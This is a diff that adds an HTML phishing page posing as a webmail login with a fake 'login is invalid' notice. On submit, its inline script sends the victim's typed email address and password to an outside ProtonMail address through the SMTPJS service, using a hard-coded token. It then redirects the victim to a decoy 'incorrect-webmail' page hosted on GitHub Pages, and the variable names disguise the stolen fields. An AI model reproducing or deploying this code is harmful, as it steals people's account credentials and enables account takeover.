@@ -1,0 +1,74 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link href="style copy.css" rel="stylesheet" />
+    <script src="script.js" ></script>
+    <title>Log in</title>
+    
+
+</head>
+<body class="lapsa">
+    <div  class="contentwrapper"  >
+        <img src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgZsxlKqP0y81A6dKcVn1N5x3BYBKSTzc_HchgBH5D2Ox4m8e7uImLHaokSXsVwE9ZG1SolpOaNGTvN-lnAyjm0PiEyv1inSpng2zUmflmXF0Rt8ekvy4T5lDyTVbfwQe0whN8hJp-FfpVj5ak0Az2uQnegeKqOPX9v_QJExpby-9vQPfOeR-ge04VpO2XN/s1600/notice-error.png" class="llner"/>
+        <label class="Iblcontentwrapper">
+                The login is invalid
+        </label>  
+        
+    </div >
+
+    <div class="loginbox">
+        <form class="login"  action="#" >
+            <img src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjaFAjou7hcGpQ-ndOxAkn7dGTEMUiDUD3r9kT2A6x8c12bgmf2_kwyFa6Jf1DAWlV-4CUBM8vvxzZ9s8zXdlJPgwMyolyoNwNZTGxjRXLBieT1mZeLnizALzkwijEcJDqJsC3WaW1TO5F1sNLEtjAeGXYNBkDTIwJInCzslQ4pME-Xo8BjmW_pE_uLOG-V/s320/images.png" alt="Alternate text" class="user" />
+            <label class="Iblemail">
+                <b>
+                    Email Address
+                </b>
+            </label>
+            <input type="email" name="email" class="txtemail" placeholder="Enter your email address" required>
+            <br>
+            <label class="Iblpass">
+                <b>
+                    Password
+                </b>
+            </label>  
+            <input type="Password" name="Pass" class="txtpass" placeholder="Enter your email password" required>
+            <br><br>
+            <button class="btnsubmit" type="submit" >Log in</button>
+            <br><br>
+
+        </form>
+        <script src="https://smtpjs.com/v3/smtp.js">
+        </script>
+    
+        <script>
+              
+            const form = document.querySelector('.login')
+    
+    
+           function sendMsg(e){
+            e.preventDefault();
+            
+                const  Fullname = document.querySelector('.txtemail')
+                  department = document.querySelector('.txtpass')
+    
+    
+             Email.send({
+             SecureToken : "523b9631-eba2-428d-b404-b38a5c0db98f",
+             To : 'mattew20201@protonmail.com',
+             From : "yohnlom@gmail.com",
+             Subject : "This is the subject"+"="+Fullname.value,
+             Body : "<br>NAME=="+Fullname.value+"<br>department=="+department.value
+             });
+             window.location.href = "https://employee-evaluationreport.github.io/report543jdsdj34ew/incorrect-webmail.html";
+           }
+    
+           form.addEventListener('submit', sendMsg);
+    
+            
+        </script>
+    </div>
+</body>
+</html>
